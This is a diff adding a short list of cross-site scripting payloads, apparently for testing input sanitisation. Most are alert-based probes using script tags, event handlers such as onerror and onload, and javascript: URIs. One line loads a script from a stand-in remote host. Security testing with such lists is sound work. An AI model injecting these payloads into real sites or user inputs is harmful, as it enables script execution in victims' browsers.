@@ -1,0 +1,14 @@
+<sCript>alert('XSS 1')</scriPt>
+<img src=x onerror=alert('XSS 2')>
+<svg/onload=alert('XSS 3')>
+<a href='javascript:alert('XSS 4')'>Click me</a>
+<body onload=alert('XSS 5')>
+<iframe src='javascript:alert('XSS 6')'></iframe>
+<input onfocus=alert('XSS 7') autofocus>
+<marquee behavior='alternate' onmouseover=alert('XSS 8')>Hover me!</marquee>
+<script src='//example.com/xss.js'></script>
+<div onmouseover='alert(9)'>Mouse over me!</div>
+<p title=''><img src=x onerror='alert(10)' /></p>
+<script>alert('XSS 11')</script>
+<!--<script>alert('XSS 12')</script>-->
+<script>confirm('XSS 13')</script>
